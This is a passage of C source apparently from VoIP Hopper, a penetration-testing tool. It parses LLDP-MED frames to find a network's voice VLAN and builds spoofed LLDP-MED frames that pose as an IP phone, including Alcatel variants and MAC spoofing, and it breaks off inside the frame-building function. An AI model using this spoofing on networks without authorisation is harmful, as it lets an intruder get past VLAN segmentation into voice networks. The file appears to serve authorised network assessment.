/*
    voiphopper - VoIP Hopper 
    Copyright (C) 2012 Jason Ostrom <jpo@pobox.com>

    This file is part of VoIP Hopper.

    VoIP Hopper is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 3 of the License, or
    (at your option) any later version.

    VoIP Hopper is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <rpc/types.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <errno.h>

#include <pcap.h>
#include <syslog.h>
#include <ctype.h>
#include <sys/types.h>
#include <time.h>
#include <getopt.h>
#include <unistd.h>
#include <fcntl.h>
#include <strings.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <linux/if_vlan.h>
#include <net/if.h>
#include <linux/sockios.h>
#include <pthread.h>

#include "pathnames.h"
#include "signals.h"
#include "protocols.h"
#include "packets.h"
#include "dhcpclient.h"
#include "netinfo.h"

#include "global_includes.h"
#include "lldp.h"

// dst of LLDP_Multicast, 01:80:c2:00:00:0e
u_char LLDP_DEST[6] = { 0x01, 0x80, 0xC2, 0x00, 0x00, 0x0E};
u_char LLDP_TYPE[2] = { 0x88, 0xCC };
#define LLDP_FRAME_SIZE 1700
#define SIZE_ETHERNET 14
u_char lldpframe[LLDP_FRAME_SIZE];

extern int assessment_mode;
extern int alcatel_yes;
extern int alcatel_vvid_disc;
extern int alcatelmode;
extern int macy;

//from main.c
extern int debug_yes;

//from voiphop.c
extern char *IfName;

//from asl.c
extern FILE *myassfile1;

// Declare some variables
int ass_lldp_vvid_discovered = 0; 
char *lldpDeviceID;
packet_ifconfig_t     packet_ifconfig;
int spoofed_lldp_packet_len = 0;
struct lldphost lldpendpoints[65535];
int lldpcount = 0;

// libpcap
pcap_t *handle;
struct pcap_pkthdr *header;
const u_char *packet;
struct bpf_program fp;
char errbuf[PCAP_ERRBUF_SIZE];
bpf_u_int32 mask;
bpf_u_int32 net;

// Function declarations
pcap_t * create_lldp_pcap(char *IfName_temp);
void *send_lldp(void *threadarg, char *lldpmac);

int get_lldp( const struct pcap_pkthdr *header, const u_char *packet) {

        int packetlen = header->len;
	//printf("\nInside of parsing LLDP-MED packet, packet length:  %d\n",packetlen);
	/* Check to see if this is the spoofed LLDP packet that is sent */
        if (packetlen == spoofed_lldp_packet_len) {
                //Spoofed packet, do nothing
                return 0;
        }

	//printf("\nInside of parsing LLDP-MED packet, packet length:  %d\n",packetlen);
        int size_lldp_data;
	int retval;
        const struct ethernet_header *eth_ptr;
        const struct logical_link_control *llc;
	//const struct LLDPTlvdata *lldptlvdata;

        eth_ptr = (struct ethernet_header*)(packet);

	// Below, checking for 0x8100 type, (802.1q VLAN tag)
	if ((packet[12] == 0x81)&&(packet[13] == 0x00)) {

		printf("802.1q Packet  (Type: 0x%02X%02X) ~ ",packet[12],packet[13]);
		const struct vlan_header *vlan;
		vlan = (struct vlan_header*)(packet + SIZE_ETHERNET);
		llc = (struct logical_link_control*)(packet + SIZE_ETHERNET + SIZE_VLAN);

		// Further decode the 4 byte VLAN header
		if((packet[16] == 136)&&(packet[17] == 204)){
        		size_lldp_data = packetlen - 18;
                	printf("Within tagged packet it's an LLDP (Type:  0x%02X%02X)\n",packet[16],packet[17]);
			printf("Packet length:  %d, size of lldp data: %d\n",packetlen, size_lldp_data);

		} else {
                        printf("Other 802.1q packet:  Type Bytes:  0x%02X%02X\n",packet[16],packet[17]);
                        printf("Need to return\n");
                        return 0;

		}

	// Below, checking for 0x88CC type (LLDP)
	} else if ((packet[12] == 0x88)&&(packet[13] == 0xCC)){
		
        	size_lldp_data = packetlen - SIZE_ETHERNET;
		int retvallldpcompare;

		if (debug_yes) {
			printf("Untagged LLDP Packet (Type:  0x%02X%02X)\n",packet[12],packet[13]);
			printf("Packet length:  %d, size of lldp data: %d\n",packetlen, size_lldp_data);
		}

		int tlvcount = 1;
		int poffset = SIZE_ETHERNET;

		struct LLDPTlvdata {

			u_char tlvtype[1];
			u_char tlvlength[1];
		};

		while (poffset < packetlen) {
	
			u_char tlvtype;
			u_char tlvlength;
			//struct LLDPTlvdata *s;
			//s = (struct LLDPTlvdata*)(packet + SIZE_ETHERNET + lldp_offset);

			// read offset will always be two bytes after packet offset
			// 1 byte for tlv type, and 1 byte for tlv length 
			int roffset = poffset + 2;
	
			tlvtype = packet[poffset];
			tlvlength = packet[poffset + 1];

			//printf("tlvtype: %02x, tlvlength: %02x\n",tlvtype,tlvlength);

			// start reading the offset two bytes after beginning
			/*int a;
			for ( a = 0; a < tlvlength; a++ ) {
				printf ("byte%d: %02x  ",a,packet[roffset]);
				roffset++;

			}*/
			if (tlvtype == 0x02) {
				//printf("TLV Type:  Chassis ID\n");
			} else if (tlvtype == 0x04) {
				//printf("TLV Type:  Port ID\n");
			} else if (tlvtype == 0x06) {
				//printf("TLV Type:  Time to Live\n");
			} else if (tlvtype == 0x0A) {
				char *sysnamebuff;
				sysnamebuff = (char *)malloc(40);
				memset(sysnamebuff,'\0',40);
                               	int a;
				if(debug_yes) {
					printf("System Name:  ");
				}
                                for ( a = 0; a < tlvlength; a++ ) {
					if(debug_yes == 1){
                                        	printf ("%c",packet[roffset]);
					}
					sysnamebuff[a] = packet[roffset];
					roffset++;
				}
				
				if(debug_yes == 1) {
					printf("\n");
				}

				retvallldpcompare = lldpcompare(sysnamebuff, lldpendpoints);
				if((retvallldpcompare == 1)&&(assessment_mode == 1)) {
					fprintf(myassfile1,"Discovered new LLDP-MED endpoint (# %d)\n",lldpcount);
					fprintf(myassfile1,"System Name:  %s\n",sysnamebuff);
					fflush(myassfile1);
				}

			} else if (tlvtype == 0x0C) {
				//char descrbuff[100];
				char *descrbuff;
				descrbuff = (char *)malloc(1000);
				memset(descrbuff,'\0',1000);
				int charcount = 0;
				if(debug_yes) {
					printf("System Description:  ");
                               		int a;
       	                        	for ( a = 0; a < tlvlength; a++ ) {
                                        	printf ("%c",packet[roffset]);
						descrbuff[a] = packet[roffset];
                                        	roffset++;
						charcount++;
                                	}
					printf("\n");
				} else {

                                        int a;
                                        for ( a = 0; a < tlvlength; a++ ) {
                                                descrbuff[a] = packet[roffset];
                                                roffset++;
						charcount++;
                                        }

				}

				if((retvallldpcompare == 1)&&(assessment_mode == 1)) {
					fprintf(myassfile1,"System Description:  ");
					int b;
					for (b = 0; b < charcount; b++) {
						fprintf(myassfile1,"%c",descrbuff[b]);
					}
					fprintf(myassfile1,"\n");
					fflush(myassfile1);
				} 

			} else if (tlvtype == 0x08) {
				//printf("TLV Type:  Port Description\n");
			} else if (tlvtype == 0x0E) {
				//printf("TLV Type:  System Capabilities\n");
			} else if (tlvtype == 0x10) {
				//printf("TLV Type:  Management Address\n");
				int len = packet[roffset];
				if (len == 5) {
					// likely IPv4 address
					if (packet[roffset+1] == 0x01) {
						// double check if address type is IPv4
						if(debug_yes) {
							printf("IP Address:  %d.%d.%d.%d\n",
								packet[roffset+2],
								packet[roffset+3],
								packet[roffset+4],
								packet[roffset+5]);
						}
					
						if((retvallldpcompare == 1)&&(assessment_mode == 1)) {
							fprintf(myassfile1,"IP Address:  %d.%d.%d.%d\n",
								packet[roffset+2],
								packet[roffset+3],
								packet[roffset+4],
								packet[roffset+5]);
							fflush(myassfile1);
						}

					
					}
				}
			} else if (tlvtype == 0xFE) {
				//printf("TLV Type:  Organization Specific\n");
				if((packet[roffset] == 0x00)&&(packet[roffset + 1] == 0x12)&&(packet[roffset+2] == 0xbb)) {

					if(packet[roffset+3] == 0x02) {
						//printf("Organization Unique Code:  TIA\n");
						//printf("Media Subtype:  Network Policy\n");
                                        	if((packet[roffset+4] == 0x01)||(packet[roffset+4] == 0x02)) {

							// Need to decode bytes offset of roffset +5, +6
							//printf("Bytes to decode:  %02X %02X\n",packet[roffset+5],packet[roffset+6]);
							//char bits[2] = { 0x21, 0x91 };
							char bits[2] = { packet[roffset+5], packet[roffset+6] };
							unsigned short value = 0;

							// copy bytes into the right "type" of variable, a short
							memcpy(&value, bits, sizeof(bits) );
							value = ntohs(value);
							//printf("value = %d, %0x%04x\n",value,value);

							// Now that we have the right byte representation, get value of the bits
							// Shift to the right 1 bit, discarding the LSB 
							value = value >> 1;
							//printf("value = %d, %0x%04x\n",value,value);
							// mask off bits 12-15, as we only want bits 0-11
							value = value & 0x0fff;
							//printf("value = %d, 0x%04x\n",value,value);

							if (value > 0) {

                                                                // VVID is learned through TIA - Network Policy
								if(ass_lldp_vvid_discovered == 0) {
									// only print discovered VVID through LLDP once
                                                                	printf("Discovered VoIP VLAN through LLDP-MED: %d\n",value);
									ass_lldp_vvid_discovered = 1;
								} else {

								}
								return value;
                                                        }
							
 
                                        	} else {
                                                	//printf("Application Type:  Other\n");
                                        
                                        	}

		
					}

				}	
			} else {
				// Don't know or don't care
			}

			poffset = poffset + 2 + tlvlength;
			tlvcount++;
		} 
		
        } else {
		printf("Other Packet:  Type Bytes:  0x%02X%02X\n",packet[12],packet[13]);
		printf("Need to return\n");
		return 0;
	}

}
unsigned int mk_spoof_lldp_a2(char *lldpmac) {

        /* Spoofing an LLDP-MED packet compliant with Alcatel method */
        /* Spoof 1st packet */

        struct eth_lldp         *ethh;
        struct lldpchassisid    *lldp_chassisid;
        struct lldpportid_a       *lldp_portid;
        struct lldpttl          *lldp_ttl;
	struct lldpcaps		*lldp_caps;
	struct lldpmacphy	*lldp_macphy;
	struct lldpmediacaps	*lldp_mediacaps;
	struct lldpnetworkpolicy	*lldp_networkpolicyv;
        struct lldpendpdu       *lldp_endpdu;
        u_char                  *lldpend;
        unsigned char tmpMac2[28];

        // set all bytes in 'lldpframe' block of memory to 0 
        memset(&lldpframe,0,sizeof(lldpframe));

        /* Make Ethernet II header */
        ethh=(struct eth_lldp *)lldpframe;
        memcpy(&(ethh->saddr),&(packet_ifconfig.eth),ETH_ALEN);
        memcpy(&(ethh->daddr),&LLDP_DEST,ETH_ALEN);
        memcpy(&(ethh->type),&LLDP_TYPE,2);

        /* make Chassis ID TLV */
        lldp_chassisid=(struct lldpchassisid *)((void*)ethh + sizeof(struct eth_lldp));
        lldp_chassisid->tlvtype = 0x02;
        lldp_chassisid->tlvlength = 0x07;
        // type 0x04 is MAC Address
        lldp_chassisid->value[0] = 0x04;

        /* MAC address spoofing enabled, so spoof within Alcatel LLDP */
        if (macy == 1) {

                /* A loop below to remove ':' char */
                int i;
                int y = 0;

                for (i = 0; i < 17; i++) {

                        if(lldpmac[i] == ':') {
                        } else {
                                tmpMac2[y] = lldpmac[i];
                                y++;
                        }

                }
                /* End of loop to remove ':' char */
                tmpMac2[y] = '\0';

                /* Convert all characters to upper case */
                for (y = 0; y < strlen(tmpMac2); y++) {
                        tmpMac2[y] = toupper(tmpMac2[y]);
                }
                /* End of Convert all characters to upper case */

                /* Function to take two ASCII represented characters and output 1 hex byte representation */
                uint8_t* hex_decode(const char *in, size_t len, uint8_t *out) {

                        unsigned int i, t, hn, ln;

                        for(t = 0, i = 0; i < len; i+=2, ++t) {

                                hn = in[i] > '9' ? in[i] - 'A' + 10 : in[i] - '0';
                                ln = in[i+1] > '9' ? in[i+1] - 'A' + 10 : in[i+1] - '0';

                                out[t] = (hn << 4 ) | ln;
                        }

                        return out;
                }

                /* Take two ASCII represented characters and output 1 hex byte representation */
                uint8_t output[6];
                hex_decode(tmpMac2,strlen(tmpMac2), output);

                lldp_chassisid->value[1] = output[0];
                lldp_chassisid->value[2] = output[1];
                lldp_chassisid->value[3] = output[2];
                lldp_chassisid->value[4] = output[3];
                lldp_chassisid->value[5] = output[4];
                lldp_chassisid->value[6] = output[5];

        /* Use hard coded MAC for spoofing Alcatel LLDP */
        } else {

                lldp_chassisid->value[1] = 0x00;
                lldp_chassisid->value[2] = 0x80;
                lldp_chassisid->value[3] = 0x9f;
                lldp_chassisid->value[4] = 0xad;
                lldp_chassisid->value[5] = 0x42;
                lldp_chassisid->value[6] = 0x42;

        }
        /* End of make Chassis ID TLV */

        /* make Port ID TLV */
        lldp_portid=(struct lldpportid_a *)((void*)lldp_chassisid + sizeof(struct lldpchassisid));
        lldp_portid->tlvtype = 0x04;
        lldp_portid->tlvlength = 0x07;
        if (macy == 1) {

                /* Some new code to spoof the user supplied MAC */
                /* A loop below to remove ':' char */
                int i;
                int y = 0;

                for (i = 0; i < 17; i++) {

                        if(lldpmac[i] == ':') {
                        } else {
                                tmpMac2[y] = lldpmac[i];
                                y++;
                        }

                }
                /* End of loop to remove ':' char */
                tmpMac2[y] = '\0';

                /* Convert all characters to upper case */
                for (y = 0; y < strlen(tmpMac2); y++) {
                        tmpMac2[y] = toupper(tmpMac2[y]);
                }
                /* End of Convert all characters to upper case */

                /* Function to take two ASCII represented characters and output 1 hex byte representation */
                uint8_t* hex_decode(const char *in, size_t len, uint8_t *out) {

                        unsigned int i, t, hn, ln;

                        for(t = 0, i = 0; i < len; i+=2, ++t) {

                                hn = in[i] > '9' ? in[i] - 'A' + 10 : in[i] - '0';
                                ln = in[i+1] > '9' ? in[i+1] - 'A' + 10 : in[i+1] - '0';

                                out[t] = (hn << 4 ) | ln;
                        }

                        return out;
                }

                /* Take two ASCII represented characters and output 1 hex byte representation */
                uint8_t output[6];
                hex_decode(tmpMac2,strlen(tmpMac2), output);

                lldp_portid->value[0] = 0x03;
                lldp_portid->value[1] = output[0];
                lldp_portid->value[2] = output[1];
                lldp_portid->value[3] = output[2];
                lldp_portid->value[4] = output[3];
                lldp_portid->value[5] = output[4];
                lldp_portid->value[6] = output[5];

        } else {
		/* if no MAC is specified with -m option, use a hard-coded value */
                lldp_portid->value[0] = 0x03;
                lldp_portid->value[1] = 0x00;
                lldp_portid->value[2] = 0x80;
                lldp_portid->value[3] = 0x9f;
                lldp_portid->value[4] = 0xad;
                lldp_portid->value[5] = 0x42;
                lldp_portid->value[6] = 0x42;
        }
        /* End of make Port ID TLV */

        /* make TTL */
        lldp_ttl=(struct lldpttl *)((void*)lldp_portid + sizeof(struct lldpportid_a));
        lldp_ttl->tlvtype = 0x06;
        lldp_ttl->tlvlength = 0x02;
        lldp_ttl->value = ntohs(0x0000);
        /* End of make TTL */

        /* make Capabilities */
        lldp_caps=(struct lldpcaps *)((void*)lldp_ttl + sizeof(struct lldpttl));
        lldp_caps->tlvtype = 0x0e;
        lldp_caps->tlvlength = 0x04;
        /* This makes 'Capabilities' of 0x0020, which is telephone*/
        /* This makes 'Enabled Capabilities' of 0x0020, which is telephone */
        lldp_caps->value[0] = 0x00;
        lldp_caps->value[1] = 0x20;
        lldp_caps->value[2] = 0x00;
        lldp_caps->value[3] = 0x20;
        /* End of make Capabilities */


        /* make IEEE 802.3 - MAC/PHY Configuration/Status */
        lldp_macphy=(struct lldpmacphy *)((void*)lldp_caps + sizeof(struct lldpcaps));
        lldp_macphy->tlvtype = 0xfe;
        lldp_macphy->tlvlength = 0x09;
        /* The following 9 bytes make the following:
        Organization Unique Code:  IEEE 802.3 (0x00120f)
        IEEE 802.3 Subtype:  MAC/PHY Configuration/Status (0x01)
        Auto-Negotiation Support/Status:  0x03
        PMD Auto-Negotiation Advertised Capability:  0x6c03
        Same in inverse (wrong) bitorder
        Operational MAU Type:  100BaseTXFD - 2 pair category 5 UTP, full duplex mode (0x0010)
        */
        lldp_macphy->value[0] = 0x00;
        lldp_macphy->value[1] = 0x12;
        lldp_macphy->value[2] = 0x0f;
        lldp_macphy->value[3] = 0x01;
        lldp_macphy->value[4] = 0x03;
        lldp_macphy->value[5] = 0x6c;
        lldp_macphy->value[6] = 0x03;
        lldp_macphy->value[7] = 0x00;
        lldp_macphy->value[8] = 0x10;
        /* End of make IEEE 802.3 - MAC/PHY Configuration/Status */

        /* make Media Capabilities */
        lldp_mediacaps=(struct lldpmediacaps *)((void*)lldp_macphy + sizeof(struct lldpmacphy));
        lldp_mediacaps->tlvtype = 0xfe;
        lldp_mediacaps->tlvlength = 0x07;
        /* Makes following
        Organization Unique Code:  TIA (0x0012bb)
        Media Subtype: Media Capabilities (0x01)
        Capabilities:  0x0033
        Class Type:  Endpoint Class III
        */
        lldp_mediacaps->value[0] = 0x00;
        lldp_mediacaps->value[1] = 0x12;
        lldp_mediacaps->value[2] = 0xbb;
        lldp_mediacaps->value[3] = 0x01;
        lldp_mediacaps->value[4] = 0x00;
        lldp_mediacaps->value[5] = 0x33;
        lldp_mediacaps->value[6] = 0x03;
        /* End of make Media Capabilities */

        /* make TIA - Network Policy (Voice) */
        lldp_networkpolicyv=(struct lldpnetworkpolicy *)((void*)lldp_mediacaps + sizeof(struct lldpmediacaps));
        lldp_networkpolicyv->tlvtype = 0xfe;
        lldp_networkpolicyv->tlvlength = 0x08;
        /* Makes following
        Organization Unique Code:  TIA (0x0012bb)
        Media Subtype:  Network Policy (0x02)
        Application Type:  Voice (1)
        Policy:  Unknown
        Tagged:  No
        VLAN Id: 4095 
        L2 Priority:  0
        DSCP Value: 0 
        */
        lldp_networkpolicyv->value[0] = 0x00;
        lldp_networkpolicyv->value[1] = 0x12;
        lldp_networkpolicyv->value[2] = 0xbb;
        lldp_networkpolicyv->value[3] = 0x02;
        lldp_networkpolicyv->value[4] = 0x01;
        lldp_networkpolicyv->value[5] = 0x9f;
        lldp_networkpolicyv->value[6] = 0xfe;
        lldp_networkpolicyv->value[7] = 0x00;
        /* End of make TIA - Network Policy (Voice) */

        /* End of LLDPDU */
        lldp_endpdu=(struct lldpendpdu *)((void*)lldp_networkpolicyv + sizeof(struct lldpnetworkpolicy));
        lldp_endpdu->tlvtype = 0x00;
        lldp_endpdu->tlvtype = 0x00;

        lldpend=(u_char *)((void *)lldp_endpdu + SIZE_ETHERNET);

        return ((void *)lldpend - (void *)&lldpframe[0]);
        /* End of End of LLDPDU */


}
unsigned int mk_spoof_lldp_a1(char *lldpmac) {

	/* Spoofing an LLDP-MED packet compliant with Alcatel method */
	/* Spoof 1st packet */

        struct eth_lldp         *ethh;
        struct lldpchassisid    *lldp_chassisid;
        struct lldpportid_a       *lldp_portid;
        struct lldpttl          *lldp_ttl;
        struct lldpendpdu       *lldp_endpdu;
        u_char                  *lldpend;
        unsigned char tmpMac2[28];

        // set all bytes in 'lldpframe' block of memory to 0 
        memset(&lldpframe,0,sizeof(lldpframe));

        /* Make Ethernet II header */
        ethh=(struct eth_lldp *)lldpframe;
        memcpy(&(ethh->saddr),&(packet_ifconfig.eth),ETH_ALEN);
        memcpy(&(ethh->daddr),&LLDP_DEST,ETH_ALEN);
        memcpy(&(ethh->type),&LLDP_TYPE,2);

        /* make Chassis ID TLV */
        lldp_chassisid=(struct lldpchassisid *)((void*)ethh + sizeof(struct eth_lldp));
        lldp_chassisid->tlvtype = 0x02;
        lldp_chassisid->tlvlength = 0x07;
        // type 0x04 is MAC Address
        lldp_chassisid->value[0] = 0x04;

	/* MAC address spoofing enabled, so spoof within Alcatel LLDP */
	if (macy == 1) {

                /* A loop below to remove ':' char */
                int i;
                int y = 0;

                for (i = 0; i < 17; i++) {

                        if(lldpmac[i] == ':') {
                        } else {
                                tmpMac2[y] = lldpmac[i];
                                y++;
                        }

                }
                /* End of loop to remove ':' char */
                tmpMac2[y] = '\0';

                /* Convert all characters to upper case */
                for (y = 0; y < strlen(tmpMac2); y++) {
                        tmpMac2[y] = toupper(tmpMac2[y]);
                }
                /* End of Convert all characters to upper case */

                /* Function to take two ASCII represented characters and output 1 hex byte representation */
                uint8_t* hex_decode(const char *in, size_t len, uint8_t *out) {

                        unsigned int i, t, hn, ln;

                        for(t = 0, i = 0; i < len; i+=2, ++t) {

                                hn = in[i] > '9' ? in[i] - 'A' + 10 : in[i] - '0';
                                ln = in[i+1] > '9' ? in[i+1] - 'A' + 10 : in[i+1] - '0';

                                out[t] = (hn << 4 ) | ln;
                        }

                        return out;
                }

                /* Take two ASCII represented characters and output 1 hex byte representation */
                uint8_t output[6];
                hex_decode(tmpMac2,strlen(tmpMac2), output);

                lldp_chassisid->value[1] = output[0];
                lldp_chassisid->value[2] = output[1];
                lldp_chassisid->value[3] = output[2];
                lldp_chassisid->value[4] = output[3];
                lldp_chassisid->value[5] = output[4];
                lldp_chassisid->value[6] = output[5];

	/* Use hard coded MAC for spoofing Alcatel LLDP */
	} else {
		/* if no MAC is specified with -m option, use a hard-coded value */
                lldp_chassisid->value[1] = 0x00;
                lldp_chassisid->value[2] = 0x80;
                lldp_chassisid->value[3] = 0x9f;
                lldp_chassisid->value[4] = 0xad;
                lldp_chassisid->value[5] = 0x42;
                lldp_chassisid->value[6] = 0x42;

	}
        /* End of make Chassis ID TLV */

        /* make Port ID TLV */
        lldp_portid=(struct lldpportid_a *)((void*)lldp_chassisid + sizeof(struct lldpchassisid));
        lldp_portid->tlvtype = 0x04;
        lldp_portid->tlvlength = 0x07;
	if (macy == 1) {

                /* Some new code to spoof the user supplied MAC */
                /* A loop below to remove ':' char */
                int i;
                int y = 0;

                for (i = 0; i < 17; i++) {

                        if(lldpmac[i] == ':') {
                        } else {
                                tmpMac2[y] = lldpmac[i];
                                y++;
                        }

                }
                /* End of loop to remove ':' char */
                tmpMac2[y] = '\0';

                /* Convert all characters to upper case */
                for (y = 0; y < strlen(tmpMac2); y++) {
                        tmpMac2[y] = toupper(tmpMac2[y]);
                }
                /* End of Convert all characters to upper case */

                /* Function to take two ASCII represented characters and output 1 hex byte representation */
                uint8_t* hex_decode(const char *in, size_t len, uint8_t *out) {

                        unsigned int i, t, hn, ln;

                        for(t = 0, i = 0; i < len; i+=2, ++t) {

                                hn = in[i] > '9' ? in[i] - 'A' + 10 : in[i] - '0';
                                ln = in[i+1] > '9' ? in[i+1] - 'A' + 10 : in[i+1] - '0';

                                out[t] = (hn << 4 ) | ln;
                        }

                        return out;
                }

                /* Take two ASCII represented characters and output 1 hex byte representation */
                uint8_t output[6];
                hex_decode(tmpMac2,strlen(tmpMac2), output);

                lldp_portid->value[0] = 0x03;
                lldp_portid->value[1] = output[0];
                lldp_portid->value[2] = output[1];
                lldp_portid->value[3] = output[2];
                lldp_portid->value[4] = output[3];
                lldp_portid->value[5] = output[4];
                lldp_portid->value[6] = output[5];

 	} else {
		/* if no MAC is specified with -m option, use a hard-coded value */
                lldp_portid->value[0] = 0x03;
                lldp_portid->value[1] = 0x00;
                lldp_portid->value[2] = 0x80;
                lldp_portid->value[3] = 0x9f;
                lldp_portid->value[4] = 0xad;
                lldp_portid->value[5] = 0x42;
                lldp_portid->value[6] = 0x42;
	}
        /* End of make Port ID TLV */

        /* make TTL */
        lldp_ttl=(struct lldpttl *)((void*)lldp_portid + sizeof(struct lldpportid_a));
        lldp_ttl->tlvtype = 0x06;
        lldp_ttl->tlvlength = 0x02;
        lldp_ttl->value = ntohs(0x0000);
        /* End of make TTL */


        /* End of LLDPDU */
        lldp_endpdu=(struct lldpendpdu *)((void*)lldp_ttl + sizeof(struct lldpttl));
        lldp_endpdu->tlvtype = 0x00;
        lldp_endpdu->tlvtype = 0x00;

        lldpend=(u_char *)((void *)lldp_endpdu + SIZE_ETHERNET);

        return ((void *)lldpend - (void *)&lldpframe[0]);
        /* End of End of LLDPDU */

}
unsigned int mk_spoof_lldp(char *lldpmac) {

        struct eth_lldp    	*ethh;
	struct lldpchassisid	*lldp_chassisid;
	struct lldpportid	*lldp_portid;
	struct lldpttl		*lldp_ttl;
	struct lldpportdesc	*lldp_portdesc;
	struct lldpsname	*lldp_sname;
	struct lldpcaps		*lldp_caps;
	struct lldpmacphy	*lldp_macphy;
	struct lldpmediacaps	*lldp_mediacaps;
	struct lldpnetworkpolicy	*lldp_networkpolicyv;
	struct lldpnetworkpolicy	*lldp_networkpolicyvs;
	struct lldpextpvm	*lldp_extpvm;
	struct lldpinventoryhr	*lldp_inventoryhr;
	struct lldpinventoryfr	*lldp_inventoryfr;
	struct lldpinventorysr	*lldp_inventorysr;
	struct lldpinventorysn	*lldp_inventorysn;
	struct lldpinventorymn	*lldp_inventorymn;
	struct lldpinventorymodelname	*lldp_inventorymodelname;
	struct lldpinventoryai	*lldp_inventoryai;
	struct lldpendpdu	*lldp_endpdu;
	u_char			*lldpend;
	unsigned char tmpMac2[28];

        // set all bytes in 'lldpframe' block of memory to 0 
        memset(&lldpframe,0,sizeof(lldpframe));

        /* Make Ethernet II header */
	ethh=(struct eth_lldp *)lldpframe;
	memcpy(&(ethh->saddr),&(packet_ifconfig.eth),ETH_ALEN);
	memcpy(&(ethh->daddr),&LLDP_DEST,ETH_ALEN);
	memcpy(&(ethh->type),&LLDP_TYPE,2);

	/* Start making the LLDP-MED TLVs */
	/* All compliant LLDP Data Units (LLDPDUs) must confirm at a minimum to the following 4 mandated TLVs, in the following order
	 - Chassis ID TLV
	 - Port ID TLV
	 - TTL
	 - End of LLDPDU TLV

	 If LLDPDU includes optional TLVs, they will be inserted between the TTL TLV and the End of LLDPDU TLV
	 Optional TLVs include the Basic set of TLVs and Organizationally specific TLVs

	 Basic set of LLDP TLVs
         - Port Description
	 - System Name
 	 - System Description
	 - System Capabilities
	 - Management Address
	*/

	/* make Chassis ID TLV */
	//lldp_chassisid=(struct lldpchassisid *)((void*)ethh + sizeof(struct lldpchassisid));
	lldp_chassisid=(struct lldpchassisid *)((void*)ethh + sizeof(struct eth_lldp));
	lldp_chassisid->tlvtype = 0x02;
	lldp_chassisid->tlvlength = 0x07;
	// type 0x04 is MAC Address
	lldp_chassisid->value[0] = 0x04;

	/* If assessment mode is enabled, we must spoof a hard-coded MAC address */
	if(assessment_mode == 1) {
		// 6-byte MAC Address of 00:1e:f7:28:9c:8e
		lldp_chassisid->value[1] = 0x00;
		lldp_chassisid->value[2] = 0x1e;
		lldp_chassisid->value[3] = 0xf7;
		lldp_chassisid->value[4] = 0x28;
		lldp_chassisid->value[5] = 0x9c;
		lldp_chassisid->value[6] = 0x8e;

	/* if this is true, then user specified -o so they must have specified the MAC address */
	} else {

		/* Some new code to spoof the user supplied MAC */
		/* A loop below to remove ':' char */
		int i;
		int y = 0;

		for (i = 0; i < 17; i++) {

			if(lldpmac[i] == ':') {
			} else {
				tmpMac2[y] = lldpmac[i];
				y++;
			}

		}
		/* End of loop to remove ':' char */
		tmpMac2[y] = '\0';

		/* Convert all characters to upper case */
		for (y = 0; y < strlen(tmpMac2); y++) {
			tmpMac2[y] = toupper(tmpMac2[y]);
		}
		/* End of Convert all characters to upper case */


		/* Function to take two ASCII represented characters and output 1 hex byte representation */
		uint8_t* hex_decode(const char *in, size_t len, uint8_t *out) {

			unsigned int i, t, hn, ln;

			for(t = 0, i = 0; i < len; i+=2, ++t) {

				hn = in[i] > '9' ? in[i] - 'A' + 10 : in[i] - '0';
				ln = in[i+1] > '9' ? in[i+1] - 'A' + 10 : in[i+1] - '0';

				out[t] = (hn << 4 ) | ln;
			}

			return out;
		}

		/* Take two ASCII represented characters and output 1 hex byte representation */
		uint8_t output[6];
		hex_decode(tmpMac2,strlen(tmpMac2), output);

        	lldp_chassisid->value[1] = output[0];
        	lldp_chassisid->value[2] = output[1];
        	lldp_chassisid->value[3] = output[2];
        	lldp_chassisid->value[4] = output[3];
        	lldp_chassisid->value[5] = output[4];
        	lldp_chassisid->value[6] = output[5];

	}

	/* make Port ID TLV */
	lldp_portid=(struct lldpportid *)((void*)lldp_chassisid + sizeof(struct lldpchassisid));
	lldp_portid->tlvtype = 0x04;
	lldp_portid->tlvlength = 0x10;
	/* if assessment mode, we must spoof a hard-coded Port ID TLV */
	if (assessment_mode == 1) {
		// Port ID Subtype:  Locally assigned (7)
		// Port ID:  001EF7289C8E:P1 
		lldp_portid->value[0] = 0x07;
		lldp_portid->value[1] = 0x30;
		lldp_portid->value[2] = 0x30;
		lldp_portid->value[3] = 0x31;
		lldp_portid->value[4] = 0x45;
		lldp_portid->value[5] = 0x46;
		lldp_portid->value[6] = 0x37;
		lldp_portid->value[7] = 0x32;
		lldp_portid->value[8] = 0x38;
		lldp_portid->value[9] = 0x39;
		lldp_portid->value[10] = 0x43;
		lldp_portid->value[11] = 0x38;
		lldp_portid->value[12] = 0x45;
		lldp_portid->value[13] = 0x3a;
		lldp_portid->value[14] = 0x50;
		lldp_portid->value[15] = 0x31;
        /* if else is true below, then the user has supplied their own mac address for spoofing lldp port ID */
        } else {

		/* Port ID subtype of 0x07 means locally assigned */
                lldp_portid->value[0] = 0x07;
                lldp_portid->value[1] = tmpMac2[0];
                lldp_portid->value[2] = tmpMac2[1];
                lldp_portid->value[3] = tmpMac2[2];
                lldp_portid->value[4] = tmpMac2[3];
                lldp_portid->value[5] = tmpMac2[4];
                lldp_portid->value[6] = tmpMac2[5];
                lldp_portid->value[7] = tmpMac2[6];
                lldp_portid->value[8] = tmpMac2[7];
                lldp_portid->value[9] = tmpMac2[8];
                lldp_portid->value[10] = tmpMac2[9];
                lldp_portid->value[11] = tmpMac2[10];
                lldp_portid->value[12] = tmpMac2[11];
                lldp_portid->value[13] = 0x3a;  /* :  */
                lldp_portid->value[14] = 0x50;  /* P  */
                lldp_portid->value[15] = 0x31;  /* 1  */

	}
	/* End of make Port ID TLV */

	/* make TTL */
	lldp_ttl=(struct lldpttl *)((void*)lldp_portid + sizeof(struct lldpportid));
	lldp_ttl->tlvtype = 0x06;
	lldp_ttl->tlvlength = 0x02;
	lldp_ttl->value = ntohs(0x0078);

	/* make Port Description */
        lldp_portdesc=(struct lldpportdesc *)((void*)lldp_ttl + sizeof(struct lldpttl));
        lldp_portdesc->tlvtype = 0x08;
